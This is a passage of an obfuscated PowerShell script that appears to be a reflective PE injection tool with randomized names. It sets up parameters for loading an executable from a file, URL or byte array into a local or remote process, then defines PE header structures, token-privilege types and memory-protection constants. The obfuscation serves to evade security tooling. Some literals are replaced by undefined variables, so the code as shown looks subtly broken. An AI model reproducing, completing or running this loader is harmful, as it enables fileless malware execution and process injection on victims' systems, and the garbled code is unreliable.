function sSBikZZl
{
[CmdletBinding(DefaultParameterSetName="WebFile")]
Param(
	[Parameter(ParameterSetName = "LocalFile", Position = 0, Mandatory = $rvAMLFnZ)]
	[String]
	$CyrgxSuh,
	[Parameter(ParameterSetName = "WebFile", Position = 0, Mandatory = $rvAMLFnZ)]
	[Uri]
	$SOscxAqq,
    [Parameter(ParameterSetName = "Bytes", Position = 0, Mandatory = $rvAMLFnZ)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $YyOqIfFM,
	[Parameter(Position = 1)]
	[String[]]
	$ytClMfOm,
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$fScaqsXf = 'Void',
	[Parameter(Position = 3)]
	[String]
	$mvGmwgqS,
	[Parameter(Position = 4)]
	[Int32]
	$TeCGwkPU,
	[Parameter(Position = 5)]
	[String]
	$WzJAlPZi,
    [Parameter(Position = 6)]
    [Switch]
    $XEIOQxss
)
Set-StrictMode -Version 2
$MIuxbfui = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $rvAMLFnZ)]
		[Byte[]]
		$YyOqIfFM,
		[Parameter(Position = 1, Mandatory = $rvAMLFnZ)]
		[String]
		$fScaqsXf,
		[Parameter(Position = 2, Mandatory = $rvAMLFnZ)]
		[Int32]
		$TeCGwkPU,
		[Parameter(Position = 3, Mandatory = $rvAMLFnZ)]
		[String]
		$WzJAlPZi,
        [Parameter(Position = 4, Mandatory = $rvAMLFnZ)]
        [Bool]
        $XEIOQxss
	)
	Function WLBtrRfq
	{
		$stADljpQ = New-Object System.Object
		$tCBRuuTI = [AppDomain]::CurrentDomain
		$KokowemhUtiHiWF = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$qwHSndlK = $tCBRuuTI.DefineDynamicAssembly($KokowemhUtiHiWF, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$LqiKuRGh = $qwHSndlK.DefineDynamicModule('DynamicModule', $WCARTiiv)
		$TAysBmfl = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
		$QSgTmIQY = $LqiKuRGh.DefineEnum('MachineType', 'Public', [UInt16])
		$QSgTmIQY.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$QSgTmIQY.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$QSgTmIQY.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$QSgTmIQY.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$fKFNFrsF = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name MachineType -Value $fKFNFrsF
		$QSgTmIQY = $LqiKuRGh.DefineEnum('MagicType', 'Public', [UInt16])
		$QSgTmIQY.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$bQKuhKKW = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name MagicType -Value $bQKuhKKW
		$QSgTmIQY = $LqiKuRGh.DefineEnum('SubSystemType', 'Public', [UInt16])
		$QSgTmIQY.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$tDNbRtQX = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $tDNbRtQX
		$QSgTmIQY = $LqiKuRGh.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$QSgTmIQY.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$QSgTmIQY.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$QSgTmIQY.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$QSgTmIQY.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$QSgTmIQY.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$QSgTmIQY.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$VUbdtLyh = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $VUbdtLyh
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('IMAGE_DATA_DIRECTORY', $sbgYUbxg, [System.ValueType], 8)
		($QSgTmIQY.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($QSgTmIQY.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$aOvLMnsp = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $aOvLMnsp
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('IMAGE_FILE_HEADER', $sbgYUbxg, [System.ValueType], 20)
		$QSgTmIQY.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$GHvWDtkW = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $GHvWDtkW
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('IMAGE_OPTIONAL_HEADER64', $sbgYUbxg, [System.ValueType], 240)
		($QSgTmIQY.DefineField('Magic', $bQKuhKKW, 'Public')).SetOffset(0) | Out-Null
		($QSgTmIQY.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($QSgTmIQY.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($QSgTmIQY.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($QSgTmIQY.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($QSgTmIQY.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($QSgTmIQY.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($QSgTmIQY.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($QSgTmIQY.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($QSgTmIQY.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($QSgTmIQY.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($QSgTmIQY.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($QSgTmIQY.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($QSgTmIQY.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($QSgTmIQY.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($QSgTmIQY.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($QSgTmIQY.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($QSgTmIQY.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($QSgTmIQY.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($QSgTmIQY.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($QSgTmIQY.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($QSgTmIQY.DefineField('Subsystem', $tDNbRtQX, 'Public')).SetOffset(68) | Out-Null
		($QSgTmIQY.DefineField('DllCharacteristics', $VUbdtLyh, 'Public')).SetOffset(70) | Out-Null
		($QSgTmIQY.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($QSgTmIQY.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($QSgTmIQY.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($QSgTmIQY.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($QSgTmIQY.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($QSgTmIQY.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($QSgTmIQY.DefineField('ExportTable', $aOvLMnsp, 'Public')).SetOffset(112) | Out-Null
		($QSgTmIQY.DefineField('ImportTable', $aOvLMnsp, 'Public')).SetOffset(120) | Out-Null
		($QSgTmIQY.DefineField('ResourceTable', $aOvLMnsp, 'Public')).SetOffset(128) | Out-Null
		($QSgTmIQY.DefineField('ExceptionTable', $aOvLMnsp, 'Public')).SetOffset(136) | Out-Null
		($QSgTmIQY.DefineField('CertificateTable', $aOvLMnsp, 'Public')).SetOffset(144) | Out-Null
		($QSgTmIQY.DefineField('BaseRelocationTable', $aOvLMnsp, 'Public')).SetOffset(152) | Out-Null
		($QSgTmIQY.DefineField('Debug', $aOvLMnsp, 'Public')).SetOffset(160) | Out-Null
		($QSgTmIQY.DefineField('Architecture', $aOvLMnsp, 'Public')).SetOffset(168) | Out-Null
		($QSgTmIQY.DefineField('GlobalPtr', $aOvLMnsp, 'Public')).SetOffset(176) | Out-Null
		($QSgTmIQY.DefineField('TLSTable', $aOvLMnsp, 'Public')).SetOffset(184) | Out-Null
		($QSgTmIQY.DefineField('LoadConfigTable', $aOvLMnsp, 'Public')).SetOffset(192) | Out-Null
		($QSgTmIQY.DefineField('BoundImport', $aOvLMnsp, 'Public')).SetOffset(200) | Out-Null
		($QSgTmIQY.DefineField('IAT', $aOvLMnsp, 'Public')).SetOffset(208) | Out-Null
		($QSgTmIQY.DefineField('DelayImportDescriptor', $aOvLMnsp, 'Public')).SetOffset(216) | Out-Null
		($QSgTmIQY.DefineField('CLRRuntimeHeader', $aOvLMnsp, 'Public')).SetOffset(224) | Out-Null
		($QSgTmIQY.DefineField('Reserved', $aOvLMnsp, 'Public')).SetOffset(232) | Out-Null
		$oIOpRxXj = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $oIOpRxXj
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('IMAGE_OPTIONAL_HEADER32', $sbgYUbxg, [System.ValueType], 224)
		($QSgTmIQY.DefineField('Magic', $bQKuhKKW, 'Public')).SetOffset(0) | Out-Null
		($QSgTmIQY.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($QSgTmIQY.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($QSgTmIQY.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($QSgTmIQY.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($QSgTmIQY.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($QSgTmIQY.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($QSgTmIQY.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($QSgTmIQY.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($QSgTmIQY.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($QSgTmIQY.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($QSgTmIQY.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($QSgTmIQY.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($QSgTmIQY.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($QSgTmIQY.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($QSgTmIQY.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($QSgTmIQY.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($QSgTmIQY.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($QSgTmIQY.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($QSgTmIQY.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($QSgTmIQY.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($QSgTmIQY.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($QSgTmIQY.DefineField('Subsystem', $tDNbRtQX, 'Public')).SetOffset(68) | Out-Null
		($QSgTmIQY.DefineField('DllCharacteristics', $VUbdtLyh, 'Public')).SetOffset(70) | Out-Null
		($QSgTmIQY.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($QSgTmIQY.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($QSgTmIQY.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($QSgTmIQY.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($QSgTmIQY.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($QSgTmIQY.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($QSgTmIQY.DefineField('ExportTable', $aOvLMnsp, 'Public')).SetOffset(96) | Out-Null
		($QSgTmIQY.DefineField('ImportTable', $aOvLMnsp, 'Public')).SetOffset(104) | Out-Null
		($QSgTmIQY.DefineField('ResourceTable', $aOvLMnsp, 'Public')).SetOffset(112) | Out-Null
		($QSgTmIQY.DefineField('ExceptionTable', $aOvLMnsp, 'Public')).SetOffset(120) | Out-Null
		($QSgTmIQY.DefineField('CertificateTable', $aOvLMnsp, 'Public')).SetOffset(128) | Out-Null
		($QSgTmIQY.DefineField('BaseRelocationTable', $aOvLMnsp, 'Public')).SetOffset(136) | Out-Null
		($QSgTmIQY.DefineField('Debug', $aOvLMnsp, 'Public')).SetOffset(144) | Out-Null
		($QSgTmIQY.DefineField('Architecture', $aOvLMnsp, 'Public')).SetOffset(152) | Out-Null
		($QSgTmIQY.DefineField('GlobalPtr', $aOvLMnsp, 'Public')).SetOffset(160) | Out-Null
		($QSgTmIQY.DefineField('TLSTable', $aOvLMnsp, 'Public')).SetOffset(168) | Out-Null
		($QSgTmIQY.DefineField('LoadConfigTable', $aOvLMnsp, 'Public')).SetOffset(176) | Out-Null
		($QSgTmIQY.DefineField('BoundImport', $aOvLMnsp, 'Public')).SetOffset(184) | Out-Null
		($QSgTmIQY.DefineField('IAT', $aOvLMnsp, 'Public')).SetOffset(192) | Out-Null
		($QSgTmIQY.DefineField('DelayImportDescriptor', $aOvLMnsp, 'Public')).SetOffset(200) | Out-Null
		($QSgTmIQY.DefineField('CLRRuntimeHeader', $aOvLMnsp, 'Public')).SetOffset(208) | Out-Null
		($QSgTmIQY.DefineField('Reserved', $aOvLMnsp, 'Public')).SetOffset(216) | Out-Null
		$NSorgIQi = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $NSorgIQi
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('IMAGE_NT_HEADERS64', $sbgYUbxg, [System.ValueType], 264)
		$QSgTmIQY.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('FileHeader', $GHvWDtkW, 'Public') | Out-Null
		$QSgTmIQY.DefineField('OptionalHeader', $oIOpRxXj, 'Public') | Out-Null
		$NcbmQNCW = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $NcbmQNCW
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('IMAGE_NT_HEADERS32', $sbgYUbxg, [System.ValueType], 248)
		$QSgTmIQY.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('FileHeader', $GHvWDtkW, 'Public') | Out-Null
		$QSgTmIQY.DefineField('OptionalHeader', $NSorgIQi, 'Public') | Out-Null
		$QLJDGIMi = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $QLJDGIMi
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('IMAGE_DOS_HEADER', $sbgYUbxg, [System.ValueType], 64)
		$QSgTmIQY.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_ovno', [UInt16], 'Public') | Out-Null
		$GfLlsuKl = $QSgTmIQY.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$mXtoCPwa = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$KokowemhkgeHdWJ = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$ohnUsICV = New-Object System.Reflection.Emit.CustomAttributeBuilder($TAysBmfl, $mXtoCPwa, $KokowemhkgeHdWJ, @([Int32] 4))
		$GfLlsuKl.SetCustomAttribute($ohnUsICV)
		$QSgTmIQY.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null
		$bRTcaSFG = $QSgTmIQY.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$mXtoCPwa = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$ohnUsICV = New-Object System.Reflection.Emit.CustomAttributeBuilder($TAysBmfl, $mXtoCPwa, $KokowemhkgeHdWJ, @([Int32] 10))
		$bRTcaSFG.SetCustomAttribute($ohnUsICV)
		$QSgTmIQY.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$ISKShoCN = $QSgTmIQY.CreateType()	
		$stADljpQ | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $ISKShoCN
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('IMAGE_SECTION_HEADER', $sbgYUbxg, [System.ValueType], 40)
		$eSeuuRpT = $QSgTmIQY.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$mXtoCPwa = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$ohnUsICV = New-Object System.Reflection.Emit.CustomAttributeBuilder($TAysBmfl, $mXtoCPwa, $KokowemhkgeHdWJ, @([Int32] 8))
		$eSeuuRpT.SetCustomAttribute($ohnUsICV)
		$QSgTmIQY.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$sAUgvqKU = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $sAUgvqKU
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('IMAGE_BASE_RELOCATION', $sbgYUbxg, [System.ValueType], 8)
		$QSgTmIQY.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$liESFyTm = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $liESFyTm
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('IMAGE_IMPORT_DESCRIPTOR', $sbgYUbxg, [System.ValueType], 20)
		$QSgTmIQY.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('Name', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$dTTEPPwF = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $dTTEPPwF
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('IMAGE_EXPORT_DIRECTORY', $sbgYUbxg, [System.ValueType], 40)
		$QSgTmIQY.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$QSgTmIQY.DefineField('Name', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('Base', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$gGBQqOFU = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $gGBQqOFU
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('LUID', $sbgYUbxg, [System.ValueType], 8)
		$QSgTmIQY.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$FYOLPdTh = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name LUID -Value $FYOLPdTh
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('LUID_AND_ATTRIBUTES', $sbgYUbxg, [System.ValueType], 12)
		$QSgTmIQY.DefineField('Luid', $FYOLPdTh, 'Public') | Out-Null
		$QSgTmIQY.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$FYOLPdTh_AND_ATTRIBUTES = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $FYOLPdTh_AND_ATTRIBUTES
		$sbgYUbxg = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$QSgTmIQY = $LqiKuRGh.DefineType('TOKEN_PRIVILEGES', $sbgYUbxg, [System.ValueType], 16)
		$QSgTmIQY.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$QSgTmIQY.DefineField('Privileges', $FYOLPdTh_AND_ATTRIBUTES, 'Public') | Out-Null
		$assuwJjs = $QSgTmIQY.CreateType()
		$stADljpQ | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $assuwJjs
		return $stADljpQ
	}
	Function KuaRSZmc
	{
		$xKjVQlKx = New-Object System.Object
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40
		$xKjVQlKx | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80
